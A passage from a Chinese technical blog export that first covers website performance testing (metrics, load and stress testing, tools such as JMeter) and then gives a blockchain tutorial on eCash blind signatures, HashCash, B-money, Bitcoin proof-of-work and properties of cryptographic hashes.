<h3 id="使用缓存"><a href="#使用缓存" class="headerlink" title="使用缓存"></a>使用缓存</h3><p>如果我们的系统属于并发量比较高的话，如果我们单纯使用数据库的话，当大量请求直接落到数据库可能数据库就会直接挂掉。使用缓存缓存热点数据，因为缓存存储在内存中，所以速度相当地快！</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>核心应用和服务优先使用更好的硬件</li>
<li>监控系统资源使用情况增加报警设置。</li>
<li>注意备份，必要时候回滚。</li>
<li>灰度发布： 将服务器集群分成若干部分，每天只发布一部分机器，观察运行稳定没有故障，第二天继续发布一部分机器，持续几天才把整个集群全部发布完毕，期间如果发现问题，只需要回滚已发布的一部分服务器即可</li>
<li>定期检查&#x2F;更换硬件： 如果不是购买的云服务的话，定期还是需要对硬件进行一波检查的，对于一些需要更换或者升级的硬件，要及时更换或者升级。</li>
<li>…..(想起来再补充！也欢迎各位欢迎补充！)</li>
</ol>
<h1 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h1><p><img src="https://my-blog-to-use.oss-cn-beijing.aliyuncs.com/2019-11/%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95.png" alt="img"></p>
<h2 id="不同角色看网站性能"><a href="#不同角色看网站性能" class="headerlink" title="不同角色看网站性能"></a>不同角色看网站性能</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>当用户打开一个网站的时候，最关注的是什么？当然是网站响应速度的快慢。比如我们点击了淘宝的主页，淘宝需要多久将首页的内容呈现在我的面前，我点击了提交订单按钮需要多久返回结果等等。</p>
<p>所以，用户在体验我们系统的时候往往根据你的响应速度的快慢来评判你的网站的性能。</p>
<h3 id="开发人员"><a href="#开发人员" class="headerlink" title="开发人员"></a>开发人员</h3><p>用户与开发人员都关注速度，这个速度实际上就是我们的系统处理用户请求的速度。</p>
<p>开发人员一般情况下很难直观的去评判自己网站的性能，我们往往会根据网站当前的架构以及基础设施情况给一个大概的值，比如：</p>
<ol>
<li>项目架构是分布式的吗？</li>
<li>用到了缓存和消息队列没有？</li>
<li>高并发的业务有没有特殊处理？</li>
<li>数据库设计是否合理？</li>
<li>系统用到的算法是否还需要优化？</li>
<li>系统是否存在内存泄露的问题？</li>
<li>项目使用的 Redis 缓存多大？服务器性能如何？用的是机械硬盘还是固态硬盘？</li>
<li>……</li>
</ol>
<h3 id="测试人员"><a href="#测试人员" class="headerlink" title="测试人员"></a>测试人员</h3><p>测试人员一般会根据性能测试工具来测试，然后一般会做出一个表格。这个表格可能会涵盖下面这些重要的内容：</p>
<ol>
<li>响应时间；</li>
<li>请求成功率；</li>
<li>吞吐量；</li>
<li>……</li>
</ol>
<h3 id="运维人员"><a href="#运维人员" class="headerlink" title="运维人员"></a>运维人员</h3><p>运维人员会倾向于根据基础设施和资源的利用率来判断网站的性能，比如我们的服务器资源使用是否合理、数据库资源是否存在滥用的情况、当然，这是传统的运维人员，现在 Devpos 火起来后，单纯干运维的很少了。我们这里暂且还保留有这个角色。</p>
<h2 id="性能测试需要注意的点"><a href="#性能测试需要注意的点" class="headerlink" title="性能测试需要注意的点"></a>性能测试需要注意的点</h2><p>几乎没有文章在讲性能测试的时候提到这个问题，大家都会讲如何去性能测试，有哪些性能测试指标这些东西。</p>
<h3 id="了解系统的业务场景"><a href="#了解系统的业务场景" class="headerlink" title="了解系统的业务场景"></a>了解系统的业务场景</h3><p>性能测试之前更需要你了解当前的系统的业务场景。 对系统业务了解的不够深刻，我们很容易犯测试方向偏执的错误，从而导致我们忽略了对系统某些更需要性能测试的地方进行测试。比如我们的系统可以为用户提供发送邮件的功能，用户配置成功邮箱后只需输入相应的邮箱之后就能发送，系统每天大概能处理上万次发邮件的请求。很多人看到这个可能就直接开始使用相关工具测试邮箱发送接口，但是，发送邮件这个场景可能不是当前系统的性能瓶颈，这么多人用我们的系统发邮件， 还可能有很多人一起发邮件，单单这个场景就这么人用，那用户管理可能才是性能瓶颈吧！</p>
<h3 id="历史数据非常有用"><a href="#历史数据非常有用" class="headerlink" title="历史数据非常有用"></a>历史数据非常有用</h3><p>当前系统所留下的历史数据非常重要，一般情况下，我们可以通过相应的些历史数据初步判定这个系统哪些接口调用的比较多、哪些 service 承受的压力最大，这样的话，我们就可以针对这些地方进行更细致的性能测试与分析。</p>
<p>另外，这些地方也就像这个系统的一个短板一样，优化好了这些地方会为我们的系统带来质的提升。</p>
<h3 id="性能测试的指标"><a href="#性能测试的指标" class="headerlink" title="性能测试的指标"></a>性能测试的指标</h3><h3 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h3><p>响应时间就是用户发出请求到用户收到系统处理结果所需要的时间。 重要吗？实在太重要！</p>
<p>比较出名的 2-5-8 原则是这样描述的：通常来说，2到5秒，页面体验会比较好，5到8秒还可以接受，8秒以上基本就很难接受了。另外，据统计当网站慢一秒就会流失十分之一的客户。</p>
<p>但是，在某些场景下我们也并不需要太看重 2-5-8 原则 ，比如我觉得系统导出导入大数据量这种就不需要，系统生成系统报告这种也不需要。</p>
<h3 id="并发数"><a href="#并发数" class="headerlink" title="并发数"></a>并发数</h3><p>并发数是系统能同时处理请求的数目即同时提交请求的用户数目。</p>
<p>不得不说，高并发是现在后端架构中非常非常火热的一个词了，这个与当前的互联网环境以及中国整体的互联网用户量都有很大关系。一般情况下，你的系统并发量越大，说明你的产品做的就越大。但是，并不是每个系统都需要达到像淘宝、12306 这种亿级并发量的。</p>
<h3 id="3-3-吞吐量"><a href="#3-3-吞吐量" class="headerlink" title="#3.3 吞吐量"></a>#3.3 吞吐量</h3><p>吞吐量指的是系统单位时间内系统处理的请求数量。衡量吞吐量有几个重要的参数：QPS（TPS）、并发数、响应时间。</p>
<ol>
<li>QPS（Query Per Second）：服务器每秒可以执行的查询次数；</li>
<li>TPS（Transaction Per Second）：服务器每秒处理的事务数（这里的一个事务可以理解为客户发出请求到收到服务器的过程）；</li>
<li>并发数；系统能同时处理请求的数目即同时提交请求的用户数目；</li>
<li>响应时间： 一般取多次请求的平均响应时间。</li>
</ol>
<p>理清他们的概念，就很容易搞清楚他们之间的关系了。</p>
<ul>
<li>QPS（TPS） &#x3D; 并发数&#x2F;平均响应时间</li>
<li>并发数 &#x3D; QPS&#x2F;平均响应时间</li>
</ul>
<p>书中是这样描述 QPS 和 TPS 的区别的。</p>
<blockquote>
<p>QPS vs TPS：QPS 基本类似于 TPS，但是不同的是，对于一个页面的一次访问，形成一个TPS；但一次页面请求，可能产生多次对服务器的请求，服务器对这些请求，就可计入“QPS”之中。如，访问一个页面会请求服务器2次，一次访问，产生一个“T”，产生2个“Q”。</p>
</blockquote>
<h3 id="性能计数器"><a href="#性能计数器" class="headerlink" title="性能计数器"></a>性能计数器</h3><p>性能计数器是描述服务器或者操作系统的一些数据指标如内存使用、CPU使用、磁盘与网络I&#x2F;O等情况。</p>
<h3 id="几种常见的性能测试"><a href="#几种常见的性能测试" class="headerlink" title="几种常见的性能测试"></a>几种常见的性能测试</h3><h3 id="性能测试-1"><a href="#性能测试-1" class="headerlink" title="性能测试"></a>性能测试</h3><p>性能测试方法是通过测试工具模拟用户请求系统，目的主要是为了测试系统的性能是否满足要求。通俗地说，这种方法就是要在特定的运行条件下验证系统的能力状态。</p>
<p>性能测试是你在对系统性能已经有了解的前提之后进行的，并且有明确的性能指标。</p>
<h3 id="负载测试"><a href="#负载测试" class="headerlink" title="负载测试"></a>负载测试</h3><p>对被测试的系统继续加大请求压力，直到服务器的某个资源已经达到饱和了，比如系统的缓存已经不够用了或者系统的响应时间已经不满足要求了。</p>
<p>负载测试说白点就是测试系统的上线。</p>
<h3 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h3><p>不去管系统资源的使用情况，对系统继续加大请求压力，直到服务器崩溃无法再继续提供服务。</p>
<h3 id="稳定性测试"><a href="#稳定性测试" class="headerlink" title="稳定性测试"></a>稳定性测试</h3><p>模拟真实场景，给系统一定压力，看看业务是否能稳定运行。</p>
<h2 id="常用性能测试工具"><a href="#常用性能测试工具" class="headerlink" title="常用性能测试工具"></a>常用性能测试工具</h2><h3 id="后端常用"><a href="#后端常用" class="headerlink" title="后端常用"></a>后端常用</h3><p>没记错的话，除了 LoadRunner 其他几款性能测试工具都是开源免费的。</p>
<ol>
<li>Jmeter ：Apache JMeter 是 JAVA 开发的性能测试工具。</li>
<li>LoadRunner：一款商业的性能测试工具。</li>
<li>Galtling ：一款基于Scala 开发的高性能服务器性能测试工具。</li>
<li>ab ：全称为 Apache Bench 。Apache 旗下的一款测试工具，非常实用。</li>
</ol>
<h3 id="前端常用"><a href="#前端常用" class="headerlink" title="前端常用"></a>前端常用</h3><ol>
<li>Fiddler：抓包工具，它可以修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是Web 调试的利器。</li>
<li>HttpWatch: 可用于录制HTTP请求信息的工具。</li>
</ol>
<h2 id="常见的性能优化策略"><a href="#常见的性能优化策略" class="headerlink" title="常见的性能优化策略"></a>常见的性能优化策略</h2><p>性能优化之前我们需要对请求经历的各个环节进行分析，排查出可能出现性能瓶颈的地方，定位问题。</p>
<p>下面是一些性能优化时，我经常拿来自问的一些问题：</p>
<ol>
<li>系统是否需要缓存？</li>
<li>系统架构本身是不是就有问题？</li>
<li>系统是否存在死锁的地方？</li>
<li>系统是否存在内存泄漏？（Java 的自动回收内存虽然很方便，但是，有时候代码写的不好真的会造成内存泄漏）</li>
<li>数据库索引使用是否合理？</li>
<li>……</li>
</ol>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>base</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链技术</title>
    <url>/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="区块链技术1-比特币八卦"><a href="#区块链技术1-比特币八卦" class="headerlink" title="区块链技术1:比特币八卦"></a>区块链技术1:比特币八卦</h1><ul>
<li>理解中本聪比特币白皮书</li>
<li>理解分布式一致性的概念</li>
<li>了解Paxos和Raft</li>
<li>理解以太坊和智能合约</li>
</ul>
<h2 id="区块链的货币属性"><a href="#区块链的货币属性" class="headerlink" title="区块链的货币属性"></a>区块链的货币属性</h2><p>设计一种电子货币，使得它能够像现金一样使用，以及不依赖于第三方组织。首先要考虑：</p>
<ol>
<li>如何生成货币：谁能获得这个货币，获得货币不能太容易，正如必须工作才能获得报酬；</li>
<li>如何将货币与所有者关联起来：现下的环境中，信用卡实名制，现金匿名；</li>
<li>如何保护交易双方：保护卖家，防止买家对支付进行回滚；保护买家，卖家对交易不能抵赖；</li>
<li>如何防止双花（double-spending）：对于现金不存在双重支付的问题，花出去了，就没有了；如果是基于信用的，有可能重花；现实中，人们不是防止重花而是在检测出重花之后加以重罚。数字货币是完全虚拟的货币，也即一串数字就代表一块币，这个数字可以被无穷次的利用，怎么样能够防止双花呢？</li>
<li>如何记账：每一笔交易有据可查，同时保护用户的隐私；</li>
</ol>
<p>参考文献</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">比特币白皮书：一种点对点的电子现金系统 | 巴比特</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://book.8btc.com/master_bitcoin">精通比特币 | 巴比特图书</a></p>
<p>【3】<a href="http://daily.zhihu.com/story/9712661">http://daily.zhihu.com/story/9712661</a></p>
<p>【5】 <a href="https://link.zhihu.com/?target=https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml">https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=https://www.weiyangx.com/327991.html">https://www.weiyangx.com/327991.html</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=http://www.tucaod.com/3990.html">http://www.tucaod.com/3990.html</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://www.odaily.com/post/5133445">https://www.odaily.com/post/5133445</a></p>
<h1 id="区块链技术2-电子货币的历史"><a href="#区块链技术2-电子货币的历史" class="headerlink" title="区块链技术2:电子货币的历史"></a>区块链技术2:电子货币的历史</h1><p>主要介绍三种电子货币，分别是eCash、 HashCash和B-money。</p>
<h2 id="eCash"><a href="#eCash" class="headerlink" title="eCash"></a>eCash</h2><p>盲签:一种特殊类型的数字签名。一般数字签名中，签名者知道所签署的消息内容。而在盲签中，签名者对他人（接收者）发来的信息进行签名，接收者首先对原始信息进行盲化，然后发送给签名者；签名者对盲化后的信息进行签名；接收者可以对这个签名后的数据去盲化，最终得到签名者关于原始信息的正确签名。</p>
<p>盲签实例:</p>
<blockquote>
<p>一个托管人想要举行一个秘密的选举，但是投票人不能聚在一起当面匿名投票，只能通过邮寄的方式将选票寄出。每个投票人都非常关心不能泄露自己的投票内容，同时也要求能够确认自己的投票确实用上了。而托管人也希望能够保证只有确定的一些人可以投票。</p>
<p>可以使用一种特殊的信封来实现目的。每个投票人将自己的投票单装入一个复写纸衬底的信封，封好，并且将这个信封装入另外一个大信封，在这个信封的外面有自己的寄回地址。当托管人收到这个有地址的信封时，可以打开大信封，拿出投票人自己封好的有复写纸的信封，然后在不拆封的情况下在信封外签字，此时，通过复写纸，他的签名也传到了投票单上；也即，在不知道投票单具体长什么样的情况下，托管人进行了签字。签好字之后，再将这个有复写纸的信封重新装入一个新的信封，寄回给投票人。投票人可以拆开有复写纸的信封，拿出自己的投票单，然后写好投票内容，在选举的日期寄给托管人，并且不标注任何个人信息。</p>
<p>当托管人收到所有投票人的匿名投票时，他能够通过投票单上的签名确认只有选定的投票人才能投票；而投票人也可以根据只有自己所知道的投票单上的信息（因为投票单是投票人自己所选的）确认自己的投票是否起作用了。</p>
</blockquote>
<p>eCash系统需要有中心银行系统，用户在银行中有存款，可以向银行提取电子货币。为了防止银行系统追踪电子货币的使用情况，用户的隐私情况，可以使用盲签名。分为取款、支付和兑现过程。</p>
<ol>
<li><p>取款过程</p>
<ul>
<li>U （User，用户）用身份认证协议向B（bank，银行）证明身份</li>
<li>U将N份电子现金文件m(内含金额（如100元）、用户ID及唯一的随机数等信息)用不同的盲因子盲化后交给B；（唯一的随机数相当于是现金货币中的编号；）</li>
<li>B随机选择一部分(如：N-1个)文件，向U 索要盲因子，恢复出文件(去盲)，审查内容是否符合要求，如是否所有的文件中都是100元</li>
<li>如果审查通过，B从未审查的文件中任取一份盲签名，并发给U，从U 的帐户中减去相应金额；否则协议终止；（这样，虽然银行对B的100元货币进行了签名，也就是担保，但是银行并不确定B所拥有的货币编号是哪一个，从而无法对用户的消费行为进行跟踪）</li>
<li>U对收到的签名文件去盲，得到电子现金（这个电子现金可以像现金一样使用；而且银行不能追踪；但是用户可以自己保存并记录，以在特殊情况下，证明这张钞票的去向，譬如贿赂等犯罪场景）。</li>
</ul>
</li>
<li><p>支付</p>
<ul>
<li>U 与C交易时，把电子现金交给C</li>
<li>C验证B的签名，如是伪造的，则拒收；否则进一步检测用户(可选)，通过后接受电子现金，提供等价的服务。</li>
</ul>
</li>
<li><p>取款</p>
<ul>
<li>C向B递交电子现金和帐户信息</li>
<li>B验证签名，若是伪造的，则拒收；否则查询数据库是否有相同的签名(防止重复使用电子现金)，若找到则C或U 重用电子现金，拒收；否则接受，在C的帐户中加上相应金额，在数据库中添加签名。</li>
</ul>
</li>
</ol>
<h2 id="HashCash"><a href="#HashCash" class="headerlink" title="HashCash"></a>HashCash</h2><p>维基百科:</p>
<blockquote>
<p>“哈希现金（Hashcash）是一种用于防止垃圾电子邮件和拒绝服务攻击的工作量证明系统，最近以其在比特币（以及其他加密货币）挖矿算法中的应用而闻名，由Adam Back于1997年3月提出。”</p>
</blockquote>
<p>HashCash主要思路:</p>
<p>通过要求在邮件发送之前，必须进行计算，譬如，通过对一封电子邮件进行哈希得到指定的包含一些字符串的散列值，证明为了发送邮件，计算机确实花费了一些时间或能量在特定的算法上，从而“证明”这是合法的邮件。</p>
<p>具体实现:</p>
<p>标题行看起来像这样：</p>
<p><code>X-Hashcash: 1:20:1303030600:adam@cypherspace.org::McMybZIhxKXu57jd:ckvi</code></p>
<p>标题包含:</p>
<ul>
<li>ver：Hashcash格式版本1（取代版本0）。</li>
<li>bits：散列代码中的零的位数。</li>
<li>date：发送消息的时间，格式为YYMMDD [hhmm [ss]]。</li>
<li>resource：接收方，例如IP地址或电子邮件地址。</li>
<li>ext：扩展（可选；在版本1中忽略）。</li>
<li>rand：随机字符串，以base-64格式编码。</li>
<li>counter：二进制计数器，以base-64格式编码。</li>
</ul>
<p>发送方具体操作:</p>
<p>发送方准备标题头并附加上初始化为随机数的计数器值（counter）。然后它计算头的160位SHA-1哈希值。如果散列的前20位（即5个最高有效十六进制数字）都是零，那么这是可接受的标题头。如果不是，则发送方递增计数器并再次尝试散列。在2^160个可能的散列值中，有2^140个散列值满足此标准。因此，随机选择将具有20个零作为散列开头的标题的机会是2^20分之一（2^20大约10^6，或大约百万分之一）。发送者需要尝试以获取有效哈希值的次数符合几何分布模型。因此，发送方平均必须尝试2^20个值才能找到有效的标题头。如果合理估计计算哈希所需的时间，则需要大约一秒钟才能找到。没有比这种暴力破解方法更有效的方法来找到有效的标题头。</p>
<p>普通用户不会因生成Hashcash字符串所需的处理时间而感到明显的问题。但是，垃圾邮件发送者因为发送大量垃圾邮件，会大大减慢速度。</p>
<p>接受者具体操作:</p>
<p>HA-1哈希值（例如，“1：20：060408：<a href="mailto:&#x61;&#100;&#97;&#x6d;&#x40;&#99;&#x79;&#x70;&#104;&#101;&#114;&#115;&#x70;&#x61;&#99;&#x65;&#46;&#x6f;&#114;&#x67;">&#x61;&#100;&#97;&#x6d;&#x40;&#99;&#x79;&#x70;&#104;&#101;&#114;&#115;&#x70;&#x61;&#99;&#x65;&#46;&#x6f;&#114;&#x67;</a> :: 1QTjaYd7niiQA &#x2F; sc：ePa”）。这在1 GHz机器上大约需要2微秒，远远少于接收其余电子邮件所需的时间。如果前20位不全为零，则散列无效。 （随着机器处理速度的提高，以后的版本可能需要更多的位为零。）</p>
<p>收件人的计算机检查标题中的日期（例如，“060408”，表示2006年4月8日的日期）。如果不在当前日期的两天内，则无效。 （两天的窗口可以补偿不同系统之间的时钟偏差和网络路由时间。）</p>
<p>收件人的计算机检查哈希字符串中的电子邮件地址是否与收件人注册的任何有效电子邮件地址匹配，或者与收件人订阅的任何邮件列表匹配。如果未找到匹配项，则哈希字符串无效。</p>
<p>收件人的计算机将哈希字符串插入数据库。如果字符串已经在数据库中（表示正在尝试重新使用哈希字符串），则该字符串无效。</p>
<p>如果散列字符串通过所有这些测试，则认为它是有效的散列字符串。所有这些测试所花费的时间和磁盘空间远远少于接收电子邮件的正文内容。</p>
<h2 id="B-money"><a href="#B-money" class="headerlink" title="B-money"></a>B-money</h2><p>在B-Money的想法中，Wei提出了两个协议。</p>
<p>在第一个协议中，每个用户都维护一个数据库（<strong>因为每个人都拥有一份数据库，所以中心机构被移除了</strong>），数据库中记录每一个假名（用户的公钥）中有多少钱。这些信息构成了一个帐簿，重点就是如何更新这些帐簿。</p>
<ol>
<li><p>创建钱。每个用户可以通过广播对以前未解决的计算问题的答案来获得钱。这样的计算的条件是必须很容易确定解决这个问题所需要的算力，解题所获得的钱与所付出的算力换算成一篮子货物的价值相等。例如，如果一道题在最经济的的情况下花了100小时的算力，而市场上需要花3篮子的货物来购买这100小时的算力，那么解开这道题产生的货币是3个单位。</p>
</li>
<li><p>转账。如果Alice（公钥A，K_A<em>）</em>决定向Bob（公钥B，K_B）转X单位的钱，那么她发送一条广播消息”我将给K_B X单位的钱“。在广播了这个消息后，系统中的每个用户将K_A用户中的钱扣除X单位；同时将B账户增加X单位。（除非会导致A用户为负）</p>
<blockquote>
<p>进一步解释:</p>
<p>如果Alice和Bob都是都是b-money的用户，那么他们都拥有公私钥对。在非对称密码体系中，公钥是公开的，所有人可见。公钥加密，私钥签名。在所有用户共同维护的账簿中，他们的公钥代表他们的身份。</p>
<p>加入Alice决定向Bob发2个单位的钱，那么Alice就会广播用自己的私钥签名的消息“从K_A发送2个单位的钱到K_B。”这条签名的信息向所有b-money用户证明，公钥A的主人想要将2个单位钱发送给公钥B。因此所有人都会更新他们的账簿。</p>
</blockquote>
</li>
<li><p>合同的影响。有效合同必须包括最大赔偿，以防每个参与方违约。它还应包括一个在发生争议时将进行仲裁的一方。合同的所有各方（包括仲裁员）必须在其生效之前广播其签名。在合同和所有签名的广播之后，每个参与者以其最高赔偿金额借记每一方的账户，并将由合同的安全散列标识的特殊账户记入最大赔偿金额。【也即保存到安全账户】如果每方的借记成功而没有产生负余额，则合同生效，否则合同将被忽略，账户将被回滚。示例合同如下:</p>
<blockquote>
<p>K_A同意在0：0：0 1&#x2F;1&#x2F;2000之前向K_B发送问题P的解。 K_B同意在0：0：0 1&#x2F;1&#x2F;2000之前支付K_A 100 MU（货币单位）。 K_C同意在发生争议时进行仲裁。 K_A同意在违约的情况下支付最多1000 MU。 K_B同意在违约的情况下支付最多200 MU。 K_C同意在违约的情况下支付最多500 MU。</p>
</blockquote>
</li>
<li><p>签订合同。如果合同无争议地结束，则各方广播一条签名消息“与SHA-1哈希H签订的合同无需赔偿即可结束”。或者可能“与SHA-1哈希H的合同以下列赔偿结束：……”在所有签名的广播中，每个参与者按其最高赔偿金额计入每一方的账户，删除合同账户，然后如果存在，则根据赔偿计划对每一方的账户进行贷记或借记。</p>
</li>
<li><p>执行合同。如果合同当事方即使在仲裁员的帮助下也无法就适当的结论达成一致，则每一方都会广播建议的赔偿&#x2F;罚款时间表以及任何有利于他的论据或证据。每个参与者确定实际的赔偿和&#x2F;或罚款，并相应地修改他的账户。</p>
</li>
</ol>
<p>DAi Wei自己提出，这个方案是不可行的，因为它依赖于同步的无阻塞的网络——也即，当Alice发给Bob两个单位的钱之后，如果她立刻又发出一条Alice发给Carol两个单位的钱的消息，那么所有人都能按照顺序接收到这两条消息。而不会出现部分人先收到Bob的消息，部分人先收到Carol的消息，（假设Alice只有两个单位的钱，那么第二条消息不会得到执行），从而造成分布式账本不一致的问题。</p>
<p>为了解决这个问题，Dai Wei提出了另一种方案，提出了部分机器担任服务器，由服务器来保管帐簿的概念。the affected participants of each transaction should verify that the message has been received and successfully processed by a randomly selected subset of the servers，而参与交易的用户需要向随机多个服务器查询，保证信息成功执行。</p>
<p>B-money特点:</p>
<ul>
<li>非常坚定的稳定币价. 在这个系统中，货币的总量没有限制，同时和现实中的一篮子的货物的价格相关联。</li>
</ul>
<p>B-money还没解决的问题:</p>
<ul>
<li>分布式一致性问题</li>
<li>工作量证明</li>
<li>无法追踪的交易</li>
</ul>
<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p>中本聪（匿名性做的最好的密码朋克的成员）提出的网络具有这样的特点:</p>
<blockquote>
<p>“该网络通过随机散列（hashing）对全部交易加上时间戳（timestamps），将它们合并入一个不断延伸的基于随机散列的工作量证明（proof-of-work）的链条作为交易记录，除非重新完成全部的工作量证明，形成的交易记录将不可更改。最长的链条不仅将作为被观察到的事件序列（sequence）的证明，而且被看做是来自CPU计算能力最大的池（pool）。只要大多数的CPU计算能力都没有打算合作起来对全网进行攻击，那么诚实的节点将会生成最长的、超过攻击者的链条”。</p>
</blockquote>
<p>比特币和B-money都保证了匿名性和可验证性;比特币引入PoW来解决分布式系统中一致性问题</p>
<p>网络运行步骤:</p>
<ol>
<li><p>新的交易向全网进行广播；</p>
</li>
<li><p>每一个节点都将收到的交易信息纳入一个区块中；</p>
</li>
<li><p>每个节点都尝试在自己的区块中找到一个具有足够难度的工作量证明；</p>
</li>
<li><p>当一个节点找到了一个工作量证明，它就向全网进行广播;</p>
<blockquote>
<p>出现分叉怎么处理?</p>
<p>假设甲矿工挖出A链347号块,然后立刻广播,并立刻去挖A链348号块,此时甲矿工收到B链的347号块,他决定先保留,以防B链更长,然后继续A链348号块,然而此时收到B链348号的消息,则甲矿工立刻放弃A链,开始挖B链349号块.此时甲矿工挖出的347号块奖励就没有了,块中所有的交易都放回交易池中,等待后续区块来打包</p>
</blockquote>
</li>
<li><p>当且仅当包含在该区块中的所有交易都是有效的且之前未存在过的，其他节点才认同该区块的有效性；</p>
</li>
<li><p>其他节点表示他们接受该区块，而表示接受的方法，则是在跟随该区块的末尾，制造新的区块以延长该链条，而将被接受区块的随机散列值视为先于新区块的随机散列值。</p>
</li>
</ol>
<p>双重支付问题:</p>
<blockquote>
<p>如果Alice试图用同一笔钱来支付两个交易，那么两个交易不可能都存在于区块链上，因为每一个交易都会被检查；即使Alice强制性地将两个交易都打包进一个区块，其他用户也不会接受包括了不正确交易的区块。如果有两个矿工分别将两笔交易打包进了自己的区块，并且都成功地完成了工作量证明，那么哪一个交易会真正地成为被大家公认的交易就要看运气了。</p>
<p>如果Bob不相信Alice，那么他可以等待Alice的支付消息被成功地打包进了区块，而且在其后又链接更多区块之后，才完成与Alice的交易。譬如Alice向Bob买一本书，按照10分钟生成一个区块的速度，Bob可以等一个小时，也即Alice的支付消息之后有了另外5个区块之后，才将书交给Alice。</p>
</blockquote>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=http://www.itianwei.com/p2p/blockchain/2018-07-27/49351.html">DigiCash为什么失败？我们当面问了问“数字货币之父”David Chaum</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://blog.sina.com.cn/s/blog_71851c8b0101c3kl.html">盲签名_DNT_EASY_新浪博客</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF">http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=http://wwwf.imperial.ac.uk/~rbellovi/writings/chaum.pdf">http://wwwf.imperial.ac.uk/~rbellovi&#x2F;writings&#x2F;chaum.pdf</a></p>
<p>【5】<a href="https://link.zhihu.com/?target=http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf">http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=http://www.weidai.com/bmoney.txt">http://www.weidai.com/bmoney.txt</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=https://www.8btc.com/article/223424">创世文档：如果说比特币有一个初稿的话，那就是Wei Dai的B-Money</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://bitcoinmagazine.com/articles/genesis-files-if-bitcoin-had-first-draft-wei-dais-b-money-was-it/">The Genesis Files: If Bitcoin Had a First Draft, Wei Dai’s B-Money Was It</a></p>
<p>【9】<a href="https://link.zhihu.com/?target=https://www.newyorker.com/magazine/2011/10/10/the-crypto-currency">The Crypto-Currency</a></p>
<p>【10】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hashcash">https://en.wikipedia.org/wiki/Hashcash</a></p>
<h1 id="区块链技术3-密码学之哈希"><a href="#区块链技术3-密码学之哈希" class="headerlink" title="区块链技术3:密码学之哈希"></a>区块链技术3:密码学之哈希</h1><p>《比特币白皮书》:</p>
<blockquote>
<p>“所以，我们非常需要这样一种电子支付系统，它基于密码学原理而不基于信用，使得任何达成一致的双方，能够直接进行支付，从而不需要第三方中介的参与。”</p>
</blockquote>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>加密哈希（cryptographic hash）:</p>
<blockquote>
<p>加密哈希是哈希函数的一种，它具有某些属性，使其适用于加密。通过加密哈希，它将任意大小的数据映射到固定大小的位串（散列），并被设计为单向函数，即一个不可逆的函数。从理想的加密散列函数输出重新创建输入数据的唯一方法是尝试对可能的输入进行暴力搜索，以查看它们是否产生匹配，或使用匹配哈希的彩虹表(里面记录了常见的hash值对应的内容)。布鲁斯施奈尔称单向散列函数是“现代密码学的主力”。输入数据通常称为消息（Message），输出（散列值或散列）通常称为消息摘要或简称为摘要（Digest）。</p>
</blockquote>
<p>理想的加密哈希函数有五个主要属性：</p>
<ol>
<li>确定性的。</li>
</ol>
<p>常见的哈希函数都满足这个特性。（只要计算过程中没有引入随机数&#x2F;调度，应该都满足？）</p>
<ol start="2">
<li>快速计算</li>
</ol>
<p>SHA-256算法的主要操作时异或运算，位运算非常快。</p>
<ol start="3">
<li>Hiding</li>
</ol>
<p>hiding就是知道哈希的结果不能倒推输入。简单来说，譬如 x mod 100这样的哈希函数，如果结果是1，那么x可能是1、101、201等无穷的数。从SHA族算法，从结果完全得不到输入的任何信息。</p>
<ol start="4">
<li><p>雪崩效应</p>
</li>
<li><p>抗冲突（collision-resistance）</p>
<p>当两个输入产生同一个输出，就发生了冲突。这里的抗冲突不是说肯定不会冲突，由鸽笼原理很容易看出，只要定义域大于值域，肯定会有冲突的。哈希函数的抗冲突指的是，虽然冲突就在那里，那就是找不到——或者说在可接受的时间内找不到。</p>
</li>
</ol>
<p>哈希函数在密码学中有着“瑞士军刀”的作用，有各种应用。</p>
<p>接下来，我们重点讨论三个特点：抗冲突、隐藏以及puzzle friendliness，以及它们的应用。</p>
<h3 id="抗冲突"><a href="#抗冲突" class="headerlink" title="抗冲突"></a>抗冲突</h3><ol>
<li><p><strong>抗冲突是指不可能找到两个x和y，其中x 不等于 y，而</strong> $H(x)&#x3D;H(y)$ 。</p>
<p>注意这里说的是不可能找到，而不是说不存在。实际上根据鸽笼原理，对于输出是256比特的SHA-256，那么只要找到2^256+1的输入，肯定可以找到至少两个值有冲突。</p>
